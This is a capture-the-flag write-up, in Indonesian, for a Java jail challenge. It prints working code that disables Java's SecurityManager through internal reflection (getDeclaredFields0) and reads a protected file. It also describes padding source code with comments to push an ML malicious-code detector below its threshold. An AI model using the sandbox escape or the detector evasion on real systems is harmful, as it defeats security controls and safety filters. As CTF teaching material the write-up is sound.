# Writeup — Jail

## Challenge

**Title:** Jail
**Category:** Jail / Misc

## Ringkasan

Challenge ini merupakan Java jail yang dikombinasikan dengan **AI-based malicious code detector**.

Service menerima source Java untuk class `UserClass`, kemudian:

1. Source dianalisis oleh model PyTorch.
2. Jika skor malicious di bawah threshold, source dikompilasi.
3. `UserClass.run()` dijalankan di dalam sandbox berbasis `SecurityManager`.
4. Tujuan akhirnya adalah membaca file `/flag`.

Solusi terdiri dari dua tahap:

1. Menurunkan skor detector AI menggunakan **adversarial comment padding**.
2. Melakukan bypass `SecurityManager` menggunakan reflection internal Java, kemudian membaca `/flag`.

Flag:

```text
uiuctf{4dv3r4r14l_y3t_funct10n4l_182df23ea}
```

---

# 1. File Challenge

Archive menyediakan beberapa file penting:

```text
Dockerfile
Jail.java
main.py
model.py
model.safetensors
nsjail.cfg
```

Peran masing-masing file:

| File                | Fungsi                                                           |
| ------------------- | ---------------------------------------------------------------- |
| `main.py`           | Menerima source Java, menjalankan detector, compile, dan execute |
| `model.py`          | Definisi model PyTorch malicious detector                        |
| `model.safetensors` | Weight model detector                                            |
| `Jail.java`         | Runner Java dan implementasi `JailSecurityManager`               |
| `nsjail.cfg`        | Konfigurasi sandbox proses                                       |

---

# 2. Analisis `main.py`

Bagian penting pada `main.py` adalah proses deteksi source.

Source Java dikonversi menjadi tensor berdasarkan byte:

```python
source_tensor = torch.tensor(
    list(source.encode("utf8")),
    dtype=torch.long
).unsqueeze(0)

logits = model(source_tensor)
```

Kemudian hasil model dibandingkan dengan threshold:

```python
if torch.sigmoid(logits) >= 0.1:
    print("malicious code detected")
    exit()
```

Jadi payload hanya akan diterima apabila:

```text
sigmoid(logits) < 0.1
```

Ini menjadi layer pertama yang harus dilewati.

---

# 3. Java Execution

Setelah source lolos detector, source ditulis menjadi:

```text
/tmp/UserClass.java
```

Kemudian dikompilasi dan dijalankan:

```python
os.system("javac UserClass.java 2>&1")
os.system("javac Jail.java 2>&1")
os.system("java Jail 2>&1")
```

`Jail.java` kemudian memasang security manager sebelum menjalankan kode user:

```java
System.setSecurityManager(new JailSecurityManager());
UserClass.run();
```

Dengan demikian, meskipun kita berhasil mengeksekusi Java code, berbagai operasi sensitif tetap diblokir.

---

# 4. Analisis `JailSecurityManager`

Security manager membatasi berbagai operasi berbahaya, termasuk:

* membaca file,
* menulis file,
* menjalankan proses,
* network access,
* thread access,
* akses package internal tertentu.

Secara sederhana, payload seperti:

```java
new java.io.File("/flag")
```

belum cukup untuk mendapatkan flag karena operasi pembacaan file akan dicegat oleh `SecurityManager`.

Maka kita membutuhkan cara untuk menonaktifkan security manager terlebih dahulu.

---

# 5. Percobaan Reflection Biasa

Pendekatan pertama adalah mencoba mengakses field `security` milik `java.lang.System`:

```java
System.class.getDeclaredField("security")
```

Secara teori, field tersebut menarik karena jika nilainya dibuat `null`, security manager tidak lagi digunakan oleh `System`.

Namun pada target remote, pendekatan tersebut menghasilkan:

```text
java.lang.NoSuchFieldException: security
```

Artinya field tersebut tidak muncul melalui reflection API biasa.

Ini menunjukkan adanya filtering terhadap field internal tertentu.

---

# 6. Bypass Reflection

Temuan penting berikutnya adalah method internal:

```java
Class.class.getDeclaredMethod(
    "getDeclaredFields0",
    Boolean.TYPE
);
```

Method internal tersebut dapat digunakan untuk memperoleh daftar field asli suatu class tanpa filtering reflection biasa.

Payload kemudian mengambil field-field milik `System`:

```java
java.lang.reflect.Method m =
    Class.class.getDeclaredMethod(
        "getDeclaredFields0",
        Boolean.TYPE
    );

m.setAccessible(true);

java.lang.reflect.Field[] a =
    (java.lang.reflect.Field[])
    m.invoke(System.class, false);
```

Kemudian field bernama `security` dicari:

```java
for (java.lang.reflect.Field f : a) {
    if (f.getName().equals("security")) {
        f.setAccessible(true);
        f.set(null, null);
    }
}
```

Dengan demikian:

```text
System.security = null
```

Security manager tidak lagi aktif untuk operasi berikutnya.

---

# 7. Membaca `/flag`

Setelah security manager berhasil dinonaktifkan, file `/flag` dapat dibaca menggunakan Java I/O biasa.

Payload yang digunakan:

```java
java.util.Scanner s =
    new java.util.Scanner(
        new java.io.File("/flag")
    );

s.useDelimiter("\\A");
System.out.println(s.next());
```

Secara keseluruhan, bagian bypass menjadi:

```java
java.lang.reflect.Method m =
    Class.class.getDeclaredMethod(
        "getDeclaredFields0",
        Boolean.TYPE
    );

m.setAccessible(true);

java.lang.reflect.Field[] a =
    (java.lang.reflect.Field[])
    m.invoke(System.class, false);

for (java.lang.reflect.Field f : a) {
    if (f.getName().equals("security")) {
        f.setAccessible(true);
        f.set(null, null);
    }
}
```

Kemudian:

```java
java.util.Scanner s =
    new java.util.Scanner(new java.io.File("/flag"));

s.useDelimiter("\\A");
System.out.println(s.next());
```

---

# 8. Mengakali AI Detector

Bypass Java saja belum cukup karena source terlebih dahulu dianalisis oleh model PyTorch.

Detector menggunakan byte source sebagai input:

```python
list(source.encode("utf8"))
```

Hal ini menarik karena **komentar Java tetap menjadi bagian dari input model**, tetapi tidak memengaruhi hasil kompilasi.

Dengan kata lain, kita dapat menambahkan komentar seperti:

```java
// random padding
// ...
```

tanpa mengubah logika program.

Komentar tersebut mengubah representasi byte yang masuk ke model sehingga skor malicious dapat berubah.

Teknik ini digunakan sebagai **adversarial comment padding**.

Target akhirnya adalah mendapatkan:

```text
sigmoid(logits) < 0.1
```

sementara source tetap menghasilkan exploit yang sama ketika dikompilasi.

---

# 9. Payload Final

Payload Java secara logika adalah:

```java
public class UserClass {
    public static void run() {
        try {
            java.lang.reflect.Method m =
                Class.class.getDeclaredMethod(
                    "getDeclaredFields0",
                    Boolean.TYPE
                );

            m.setAccessible(true);

            java.lang.reflect.Field[] a =
                (java.lang.reflect.Field[])
                m.invoke(System.class, false);

            for (java.lang.reflect.Field f : a) {
                if (f.getName().equals("security")) {
                    f.setAccessible(true);
                    f.set(null, null);
                }
            }

            java.util.Scanner s =
                new java.util.Scanner(
                    new java.io.File("/flag")
                );

            s.useDelimiter("\\A");
            System.out.println(s.next());

        } catch (Throwable e) {
            e.printStackTrace(System.out);
        }
    }
}
```

Payload tersebut kemudian diberi padding komentar adversarial sebelum dikirim ke service.

---

# 10. Exploit Flow

Alur lengkap exploit:

```text
                 Java Source
                     |
                     v
          +---------------------+
          | AI Malicious Filter |
          +---------------------+
                     |
              score >= 0.1?
                /       \
              yes        no
               |          |
             reject       v
                       javac
                         |
                         v
                   Jail.java
                         |
                         v
               SecurityManager
                         |
                         v
              Reflection Bypass
                         |
                         v
              System.security= null
                         |
                         v
                   Read /flag
                         |
                         v
                       FLAG
```

Bagian AI bypass dan Java exploit saling melengkapi:

```text
Adversarial comments
        ↓
AI detector bypass
        ↓
Java execution
        ↓
Reflection bypass
        ↓
SecurityManager disabled
        ↓
Read /flag
```

---

# 11. Solver

Solver melakukan beberapa langkah utama:

1. Membuat source Java dari payload utama.
2. Menambahkan static adversarial comment padding.
3. Jika `torch` dan `safetensors` tersedia, menghitung skor detector secara lokal.
4. Memastikan skor berada di bawah threshold `0.1`.
5. Terhubung ke service remote menggunakan SSL.
6. Mengirim source Java.
7. Mengirim terminator `DONE`.
8. Membaca output service.
9. Mengekstrak flag menggunakan regex `uiuctf\{...\}`.

File solver:

```text
solve.py
```

Untuk menjalankan:

```bash
python3 solve.py
```

Jika ingin mencetak payload untuk dikirim secara manual:

```bash
python3 solve.py --print-only | ncat --ssl jail-fabd5e60c631dc497b3b.chal.uiuc.tf 1337
```

---

# 12. Output

Exploit berhasil menghasilkan:

```text
uiuctf{4dv3r4r14l_y3t_funct10n4l_182df23ea}
```

Dalam format output challenge:

```text
<FLAG>uiuctf{4dv3r4r14l_y3t_funct10n4l_182df23ea}</FLAG>
```

---

# 13. Kesimpulan

Challenge **Jail** menggabungkan dua jenis kelemahan yang berbeda.

Pertama, malicious detector berbasis byte dapat dipengaruhi menggunakan **adversarial comment padding**. Komentar tidak mengubah semantics Java, tetapi mengubah input yang diterima model.

Kedua, setelah berhasil melewati detector, `SecurityManager` dapat dilewati dengan memanfaatkan reflection internal:

```text
getDeclaredFields0()
        ↓
ambil field System
        ↓
cari "security"
        ↓
set menjadi null
        ↓
SecurityManager bypass
```

Setelah itu `/flag` dapat dibaca menggunakan Java I/O.

Keseluruhan exploit:

```text
AI adversarial padding
        ↓
Detector bypass
        ↓
Java execution
        ↓
Reflection internal
        ↓
SecurityManager bypass
        ↓
Read /flag
        ↓
uiuctf{...}
```

## Flag

```text
uiuctf{4dv3r4r14l_y3t_funct10n4l_182df23ea}
```
